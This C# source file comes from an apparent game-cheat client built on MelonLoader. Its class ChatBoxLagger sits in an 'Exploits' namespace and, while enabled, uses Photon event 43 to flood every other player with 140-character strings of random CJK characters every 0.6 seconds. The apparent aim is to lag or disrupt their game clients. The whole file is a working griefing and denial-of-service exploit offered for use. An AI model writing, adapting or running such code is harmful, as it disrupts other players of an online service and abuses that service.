using Il2Cpp;
using MelonLoader;
using Photon.Realtime;
using StellarV3External.SDK.Utils;
using System.Collections;
using System.Text;

namespace StellarV3External.Features.Exploits
{
    internal class ChatBoxLagger
    {
        private static bool lagBool;
        private static object lagObj;

        public static void State(bool enable)
        {
            lagBool = enable;

            if (enable)
            {
                if (lagObj == null)
                {
                    lagObj = MelonCoroutines.Start(StartLagger());
                }
            }
            else
            {
                if (lagObj != null)
                {
                    MelonCoroutines.Stop(lagObj);
                    lagObj = null;
                }
            }
        }

        private static IEnumerator StartLagger()
        {
            float nextSendTime = UnityEngine.Time.time;

            while (lagBool)
            {
                if (UnityEngine.Time.time >= nextSendTime)
                {
                    SendChatBoxMessage(GenChars(140));
                    nextSendTime = UnityEngine.Time.time + 0.6f;
                }

                yield return null;
            }
        }


        public static string GenChars(int length)
        {
            Random random = new Random();
            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < length; i++)
            {
                char c = (char)random.Next(0x4E00, 0x9FFF);
                sb.Append(c);
            }

            return sb.ToString();
        }

        public static void SendChatBoxMessage(string message)
        {
            PhotonUtils.OpRaiseEvent(43, message, new RaiseEventOptions
            {
                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                field_Public_EventCaching_0 = EventCaching.DoNotCache
            }, default);
        }
    }
}
